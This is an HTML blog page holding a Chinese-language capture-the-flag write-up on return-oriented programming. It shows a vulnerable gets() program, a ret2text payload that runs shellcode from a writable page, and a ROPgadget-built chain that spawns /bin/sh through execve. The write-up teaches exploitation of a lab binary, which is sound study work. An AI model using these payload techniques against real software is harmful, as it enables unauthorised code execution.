@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ROP (Return Oriented Programming) | Mars&#39; Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ret2textvulvul.c ROP (Return Oriented Programming) 顧名思義就是透過大量的 ret 指令來控制程式流程的攻擊方式，rop 存在的意義為繞過 DEP (可執行的區段不可寫入，可寫入的地方不可執行)，例如 .text 段為放置程式碼的區域，可以執行但是不能寫入，而 .sta">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP (Return Oriented Programming)">
+<meta property="og:url" content="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/index.html">
+<meta property="og:site_name" content="Mars&#39; Blog">
+<meta property="og:description" content="ret2textvulvul.c ROP (Return Oriented Programming) 顧名思義就是透過大量的 ret 指令來控制程式流程的攻擊方式，rop 存在的意義為繞過 DEP (可執行的區段不可寫入，可寫入的地方不可執行)，例如 .text 段為放置程式碼的區域，可以執行但是不能寫入，而 .stack 可以寫入資料但是不能執行，因此想法為透過程式本身就有的指令片段構成有意義的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/images/ps.png">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/images/proc_pid_maps.png">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/images/rop_gadgets.png">
+<meta property="og:updated_time" content="2017-11-27T10:51:36.978Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP (Return Oriented Programming)">
+<meta name="twitter:description" content="ret2textvulvul.c ROP (Return Oriented Programming) 顧名思義就是透過大量的 ret 指令來控制程式流程的攻擊方式，rop 存在的意義為繞過 DEP (可執行的區段不可寫入，可寫入的地方不可執行)，例如 .text 段為放置程式碼的區域，可以執行但是不能寫入，而 .stack 可以寫入資料但是不能執行，因此想法為透過程式本身就有的指令片段構成有意義的">
+<meta name="twitter:image" content="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/images/ps.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mars&#39; Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mars&#39; Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yojo3000.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ROP-Return-Oriented-Programming" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/CTF/ROP-Return-Oriented-Programming/" class="article-date">
+  <time datetime="2015-11-19T17:23:53.000Z" itemprop="datePublished">2015-11-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ROP (Return Oriented Programming)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ret2text<br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeUVBuS1Z6WHY1MWc" target="_blank" rel="noopener">vul</a><br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeZDl1YTI3MTZhQzg" target="_blank" rel="noopener">vul.c</a></p>
+<p>ROP (Return Oriented Programming) 顧名思義就是透過大量的 ret 指令來控制程式流程的攻擊方式，rop 存在的意義為繞過 DEP (可執行的區段不可寫入，可寫入的地方不可執行)，例如 .text 段為放置程式碼的區域，可以執行但是不能寫入，而 .stack 可以寫入資料但是不能執行，因此想法為透過程式本身就有的指令片段構成有意義的攻擊行為。<br>(本題經過特殊處理因此只有 bypass ASLR 但是並沒有真正 bypass DEP)</p>
+<p>vul.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  char buf[100];</span><br><span class="line">  gets(buf);</span><br><span class="line">  puts(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>可以透過 ltrace 觀察程式 library 執行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace ./vul</span><br></pre></td></tr></table></figure></p>
+<p>觀察 library 中的 get function 的參數的記憶體位置會發現每次執行都會改變，可知有開 ASLR 使得 .text 程式碼段每次執行位置不同，因此一般的 buffer overflow 覆蓋 main ret 的作法受阻，觀察程式執行時的權限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vul &amp; // 執行 vul 並且背景執行</span><br></pre></td></tr></table></figure></p>
+<p>再用 ps 指令查看目前 vul 的 pid<br><img style="width: 700px;" src="images/ps.png"></p>
+<p>可知目前的 vul 的 pid 為 4111，再查看權限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/4111/maps</span><br></pre></td></tr></table></figure></p>
+<p><img style="width: 700px;" src="images/proc_pid_maps.png"></p>
+<p>可知 0804a000 - 0804b000為 rwxp，這個區段裡面的記憶體位置並不一定會全部填滿，但是 memory allocate 會以 page(4k) 為單位，因此在該段位置的後段很可能有尚未使用的區塊，(這裡可以權限全開是經過特殊處理，一般而言開 DEP 的話是不能執行的)，也因此 shellcode 送上這段才有意義(可執行)</p>
+<p>另外，此段是got段 (非data段) 因此也不能夠直接寫 0804a000 左右的記憶體位置，否則 call function 的時候很可能會壞掉，因此可嘗試利用後100 byte 來用 (p32(0x0804a000-0x100))，此時設計 payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos;*112 +							// buffer padding</span><br><span class="line">p32(address of gets) +				// main ret 到 gets</span><br><span class="line">p32(address of writable buffer) +	// gets ret 到 buffer</span><br><span class="line">p32(address of writable buffer) +	// gets&apos; first arg</span><br><span class="line"></span><br><span class="line">112 個 A 塞滿 buffer 後將 return address 設為 gets 的位置，一旦程式用這種非正常的情形跳至 gets 就必須幫其設定參數，因為在正常程式流程 call gets 會再 function prologue 的時候準備好參數和其 return address，此時為非正常執行 gets 因此必須在 gets 之後準備他的 return address 和 參數，可利用剛才找到的 got 段可寫的地方放置參數讓 stack 指向這個記憶體位置即可</span><br><span class="line">gets 的位置可以用 objdump 找到，而參數的 writable buffer 可填寫 p32(0x0804a000-0x100)，由於參數的位置是用來放置使用者輸入的地方，因此程式中的 send 可以代替使用者輸入塞入 shellcode，然後再將 gets 的 return address 指向同個位置 p32(0x0804a000-0x100) 即可讓 gets 執行結束之後跳至 shellcode 的開頭開始執行進而產生 shell。</span><br><span class="line">shellcode 可以自己寫，也可以透過 pwntools 提供的函式達成</span><br><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeN1JCTTYyQWxhYUU" target="_blank" rel="noopener">payload</a></p>
+<p><br><br></p>
+<p><br><br></p>
+<p>上面的 return to text 並沒有真的繞過 DEP，正常行行下開啟 DEP 之後該區段應該是不能同時可寫入又可執行的，因此要透過 ROP 的方式達到目的。</p>
+<p><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeXzFRcnY3ejFEVTA" target="_blank" rel="noopener">vul</a><br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeREJ6LW5PY2Q3blU" target="_blank" rel="noopener">vul.c</a></p>
+<p>在開啟 ASLR 和 DEP 的情形下，程式每次執行的記憶體位置會變化而且可執行之處不能寫入，可寫入之處不可執行，因此嘗試透過程式原本就有的片段組合成有意義攻擊流程。</p>
+<p>這些程式的小片段稱為 gadget，例如說 pop eax ; ret ; 之類的片段，這些片段多存在於 function 的最後面    (因為有 ret)，可以利用工具尋找可用的 gadget</p>
+<p><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a><br>clone 下來安裝即可使用</p>
+<p>透過指令生成 gadget 並且將結果輸出至 gadgetList 檔案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary vul &gt; gadgetList</span><br></pre></td></tr></table></figure></p>
+<p><img style="width: 700px;" src="images/rop_gadgets.png"></p>
+<p>檔案中會對應 gadgets 和其記憶體位置，可以從這裡尋找需要的程式片段，例如執行 shell 的 system call 需要 eax = 11; ebx = 0; edx = 0; ebx = “/bin/sh” 字串的記憶體位置</p>
+<p>先塞 payload 至 main 的 ret 之前，在 main 的 return 塞入 gadget 位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cyclic(116) +</span><br><span class="line">p32(pop_eax_ret) +		# pop eax ; ret</span><br><span class="line">p32(11) + 			# eax = 11</span><br><span class="line"></span><br><span class="line">p32(pop_edx_ecx_ebx_ret) + 	# pop those register</span><br><span class="line">p32(0) +			# edx = 0</span><br><span class="line">p32(0) +			# edx = 0</span><br><span class="line">p32(sh_str) +			# ebx = &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">p32(int_0x80) +</span><br><span class="line">&apos;\n&apos;</span><br></pre></td></tr></table></figure>
+<p>此例中 main 的 return address 塞入了 pop_eax_ret 的位置，因此程式跳至該 gadet 執行了 pop eax; ret; 指令，pop 會將目前 stack 最上方的值 assign 給 eax 後清除該位置資料並且 esp 向下移動，此時 stack 頂端為預設塞入的 11 因此成功將 eax 設為 11，以此類推設定各項 register 值。</p>
+<p>純粹的數字好處理，就放在 stack 裡面就行了，但是 “/bin/sh” 字串就必須找一個可以讀可以寫的區域，並將該字串寫入後取得字串開頭位置，可以透過覆寫 data 段的開頭放置字串 (因為 data 段必定可以讀寫且位置固定)，在 objdump 中尋找 “data_start” 就可知道 data 段的起始位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">p32(pop_eax_ret) +</span><br><span class="line">p32(data_start) +               # put data_start memory address to eax</span><br><span class="line">p32(pop_edx_ret) +</span><br><span class="line">&apos;/bin&apos; +                        # put /bin to edx</span><br><span class="line">p32(mov_dword_eax_edx_ret) +    # put edx to where eax point to</span><br><span class="line"></span><br><span class="line">p32(pop_eax_ret) +</span><br><span class="line">p32(data_start + 4) +</span><br><span class="line">p32(pop_edx_ret) +</span><br><span class="line">&apos;//sh&apos; +</span><br><span class="line">p32(mov_dword_eax_edx_ret) +</span><br><span class="line"></span><br><span class="line">p32(pop_eax_ret) +</span><br><span class="line">p32(data_start + 8) +</span><br><span class="line">p32(pop_edx_ret) +</span><br><span class="line">&apos;\x00\x00\x00\x00&apos; +            # set null byte here (for the end of the string)</span><br><span class="line">p32(mov_dword_eax_edx_ret)</span><br></pre></td></tr></table></figure>
+<p>上述的作法是 pop_eax_ret 將下一行的 data_start (data 的起始位置) 放入 eax 中，再透過 pop_ebx_ret 將下一行的 “/bin” 放入 ebx 中，最後透過 mov_dword_eax_edx_ret 將 edx 的值放到 eax 指向的位置中 (注意！並非放入 eax 本身)，從生成的 gadgetList 檔案中看到的相對應 gadget 應該是下列形式:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0807b301 : mov dword ptr [eax], edx ; ret</span><br></pre></td></tr></table></figure>
+<p>如此便可把字串 /bin/sh 及結束字串的 null byte \x00\x00\x00\x00 放入 data 段且知道該記憶體位置</p>
+<p>另外，ROPgadget 工具也支援自動產生取得 shell 功能的 gadget chain，透過加上 –ropchain 便可生成在文件最後看到自動完成的 gadget (前提是 gadget 真的足夠的話)，因此剩下的工作就只剩下找一開始的 buffer padding 了。</p>
+<p><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeeTdzRTZpaGF0ZzA" target="_blank" rel="noopener">payload</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yojo3000.github.io/CTF/ROP-Return-Oriented-Programming/" data-id="cjbfvxgt4000197pwvgc967m7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/CTF/Shellcode/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Shellcode
+        
+      </div>
+    </a>
+  
+  
+    <a href="/Linux-Server/Apache-configure-https/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Apache_configure_https</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Server/">Linux Server</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apache-SSL/">Apache SSL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Apache-SSL/" style="font-size: 10px;">Apache SSL</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/uncategorized/Chenk-Kung-Hill/">成功嶺新訓筆記</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Bubble-Sort/">Bubble-Sort</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Return-to-libc/">Return to libc</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Wireshark-Package-Analysis/">Wireshark Package Analysis</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Shellcode/">Shellcode</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Mars Huang<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
